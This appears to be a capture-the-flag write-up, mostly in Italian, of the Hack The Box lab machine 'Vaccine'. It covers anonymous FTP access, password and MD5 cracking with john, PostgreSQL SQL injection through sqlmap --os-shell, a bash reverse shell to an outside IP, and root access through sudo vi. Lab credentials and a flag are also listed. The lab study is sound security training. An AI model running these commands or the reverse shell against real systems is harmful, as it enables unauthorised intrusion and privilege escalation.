# [Vaccine] - [Linux] - [Very Easy]

## Target: 10.129.95.174

---

## Recon

### Nmap

```bash
sudo nmap -p- --min-rate 10000 -oA nmap_allports vaccine.htb
sudo nmap -sC -sV -p 21,22,80 -oA nmap_fullscan vaccine.htb
```

### Open Ports Summary

|Port|Service|Version|
|---|---|---|
|21|FTP|vsftpd 3.0.3|
|80|HTTP|Apache 2.4.41|
|22|SSH|OpenSSH 8.0p1 Ubuntu|

### Findings

- FTP accetta **anonymous login** (misconfiguration) ed espone `backup.zip`
- Porta 80 ospita una login page PHP (`MegaCorp Login`)

---

## FTP (Porta 21)

Login anonimo e download del file:

```bash
ftp 10.129.95.174
# Name: anonymous / Password: (vuota)
ftp> get backup.zip
```

Il file zip è protetto da password. Cracking con zip2john + john:

```bash
zip2john backup.zip > backup.hash
john backup.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Password trovata:** `741852963`

```bash
unzip backup.zip
# estrae: index.php, style.css
```

---

## Web (Porta 80)

### Technology

- Server: Apache 2.4.41
- Framework: PHP
- DB: PostgreSQL

### Credenziali da index.php

Nel sorgente di `index.php` si trova un hash MD5 hardcodato:

```php
$_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3"
```

Cracking dell'hash:

```bash
echo "2cb42f8734ea607eefed3b70af13bbd3" > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
```

**Password trovata:** `qwerty789`

### Credentials Found

|Username|Password|Where Found|
|---|---|---|
|admin|qwerty789|index.php (hash MD5 craccato)|
|postgres|P@s5w0rd!|dashboard.php (hardcoded)|

---

## Foothold

### Vulnerability

SQL Injection sulla barra di ricerca della dashboard (`dashboard.php?search=`). Inserendo `'` si ottiene:

```
ERROR: unterminated quoted string at or near "'"
LINE 1: Select * from cars where name ilike '%'%'
```

Confermato: **PostgreSQL SQL Injection**.

### Exploit — sqlmap

```bash
sqlmap -u "http://vaccine.htb/dashboard.php?search=test" \
  --cookie="PHPSESSID=<SESSION>" \
  --dbms=PostgreSQL \
  --os-shell \
  --batch
```

Con la `os-shell` attiva, si imposta un listener e si lancia la reverse shell.

**Terminale 1:**

```bash
nc -lvnp 4444
```

**Terminale 2 (os-shell):**

```bash
bash -c "bash -i >& /dev/tcp/10.10.14.13/4444 0>&1"
```

Stabilizzazione della shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### Shell Obtained

- **User:** postgres
- **Method:** Reverse shell via SQLi (sqlmap --os-shell)

---

## User

### User Flag

```bash
cat /var/lib/postgresql/user.txt
```

> `ec9b13ca4d6229cd5cc1e09980965bf7`

---

## Privilege Escalation

### Enumeration Findings

Credenziali hardcodate in `dashboard.php`:

```php
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
```

Verifica permessi sudo con la password trovata:

```bash
sudo -l
# User postgres may run the following commands on vaccine:
#   (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

- **sudo -l:** postgres può eseguire `vi` come root su `pg_hba.conf`
- **GTFOBins:** `vi` con sudo permette di eseguire comandi arbitrari tramite `:!/bin/bash`

### Exploit

```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Dentro vi:

```
:!/bin/bash
```

```bash
whoami
# root
```

### Root Flag

```bash
cat /root/root.txt
```

> `[root flag]`

---

## Loot

|Tipo|Valore|Dove|
|---|---|---|
|Credenziali|admin : qwerty789|index.php (MD5 hash)|
|Credenziali|postgres : P@s5w0rd!|dashboard.php|
|Hash MD5|2cb42f8734ea607eefed3b70af13bbd3|index.php|
|User flag|ec9b13ca4d6229cd5cc1e09980965bf7|/var/lib/postgresql/user.txt|
|Root flag|[root flag]|/root/root.txt|

---

## Lessons Learned

1. **FTP anonimo** è una misconfiguration comune — testare sempre anonymous login durante la recon.
2. **Hash MD5 hardcodati** nel codice sorgente sono facilmente craccabili con rockyou.
3. **sqlmap `--os-shell`** su PostgreSQL può portare direttamente a RCE senza exploit manuali.
4. Dopo una shell, cercare sempre **credenziali hardcodate** nei file PHP (specialmente connessioni DB).
5. **`sudo -l`** è il primo check per la privilege escalation — GTFOBins è la risorsa di riferimento.
6. **`vi` con sudo** è pericoloso: `:!/bin/bash` bypassa completamente le restrizioni del filesystem.